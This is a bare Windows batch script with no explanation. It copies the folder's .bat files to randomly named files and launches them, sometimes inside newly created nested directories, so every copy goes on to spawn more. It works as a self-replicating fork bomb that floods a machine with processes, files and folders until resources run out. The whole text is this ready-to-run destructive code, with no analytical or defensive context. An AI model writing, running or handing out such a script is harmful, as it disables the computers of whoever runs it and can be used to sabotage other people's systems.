
PING -n 2 127.0.0.1>nul
SET /a i=(%random%*1000/32768)
SET /a i=(%random%*1000/32768)

if %i% GTR 500 (

copy *.bat %i%.bat
Start %i%.bat
exit

) else (

mkdir %i%%i%
copy *.bat .\%i%%i%\%i%%i%.bat
cd .\%i%%i%
start %i%%i%.bat
exit
)